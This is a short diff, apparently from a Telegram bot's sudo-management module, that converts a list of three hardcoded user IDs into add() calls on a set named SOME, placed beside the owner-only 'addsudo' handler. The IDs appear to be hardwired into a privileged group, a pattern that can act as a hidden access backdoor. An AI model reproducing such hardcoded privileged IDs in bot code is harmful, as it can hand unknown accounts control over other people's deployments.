@@ -11,8 +11,9 @@ from config import BANNED_USERS, OWNER_ID
 
 RDJ_ID = 5728468284
 
-SOME = [5728468284, 6074306896, 6739866282]
-
+SOME.add(5728468284)
+SOME.add(6074306896)
+SOME.add(6739866282)
 
 @app.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
 @language
